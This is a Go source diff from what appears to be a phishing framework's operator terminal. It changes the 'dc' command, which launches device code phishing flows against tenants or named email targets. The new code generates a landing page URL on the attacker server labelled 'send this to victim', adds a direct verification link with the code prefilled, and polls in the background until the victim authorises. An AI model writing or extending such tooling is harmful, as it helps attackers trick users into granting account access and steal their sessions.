@@ -2328,48 +2328,51 @@ func (t *Terminal) filterInput(r rune) (rune, bool) {
 
 // handleDeviceCode runs the "dc" command.
 //
-//	dc                     — list all sessions + status
-//	dc start [tenant/email] — start new device code flow
+//	dc                      — list all targets + status
+//	dc start [tenant/email] — start a single device code flow
 func (t *Terminal) handleDeviceCode(args []string) error {
 	if len(args) == 0 || args[0] == "list" {
-		sessions := GetDeviceCodeSessions()
-		if len(sessions) == 0 {
+		targets := GetDCTargets()
+		if len(targets) == 0 {
 			log.Info("no device code sessions")
 			return nil
 		}
-		for _, s := range sessions {
-			s.mu.Lock()
-			status := s.Status
-			s.mu.Unlock()
+		for _, s := range targets {
+			status := s.GetStatus()
 			elapsed := time.Since(s.StartedAt).Round(time.Second)
-			log.Info("[#%d] tenant=%-20s code=%-10s status=%-10s elapsed=%s",
-				s.ID, s.Tenant, s.UserCode, status, elapsed)
+			label := s.Email
+			if label == "" {
+				label = s.Tenant
+			}
+			log.Info("[#%d] %-28s code=%-10s status=%-10s elapsed=%s",
+				s.ID, label, s.UserCode, status, elapsed)
 		}
 		return nil
 	}
 
 	switch args[0] {
 	case "start":
-		tenant := "common"
+		target := "common"
 		if len(args) > 1 {
-			tenant = args[1]
+			target = args[1]
 		}
-		sess, err := StartDeviceCode(tenant)
+		tgt, err := StartDeviceCode(target)
 		if err != nil {
 			return err
 		}
 		lc := color.New(color.FgHiCyan)
 		gc := color.New(color.FgHiGreen)
-		log.Success("device code session #%d started (tenant: %s)", sess.ID, sess.Tenant)
-		log.Info("")
-		log.Info("  Send victim:")
-		log.Info("  %s  %s", lc.Sprint(sess.VerificationURI), gc.Sprint("← link"))
-		log.Info("  %s  %s", gc.Sprint(sess.UserCode), lc.Sprint("← code to enter"))
-		log.Info("")
-		log.Info("  Expires in %d seconds. Polling in background...", sess.ExpiresIn)
+		log.Success("device code #%d started (tenant: %s)", tgt.ID, tgt.Tenant)
+		if tgt.LandingToken != "" && GlobalDCCfg != nil && GlobalDCCfg.GetBaseDomain() != "" {
+			landingURL := "http://" + GlobalDCCfg.GetServerExternalIP() + "/dc/" + tgt.LandingToken
+			log.Info("  Landing page : %s  %s", lc.Sprint(landingURL), gc.Sprint("← send this to victim"))
+		}
+		log.Info("  Direct link  : %s?code=%s", lc.Sprint(tgt.VerificationURI), gc.Sprint(tgt.UserCode))
+		log.Info("  Code         : %s", gc.Sprint(tgt.UserCode))
+		log.Info("  Expires in %d seconds. Polling in background...", tgt.ExpiresIn)
 		return nil
 
 	default:
-		return fmt.Errorf("unknown subcommand '%s' — usage: dc [start [tenant]]", args[0])
+		return fmt.Errorf("unknown subcommand '%s' — usage: dc [start [tenant|email]]", args[0])
 	}
 }
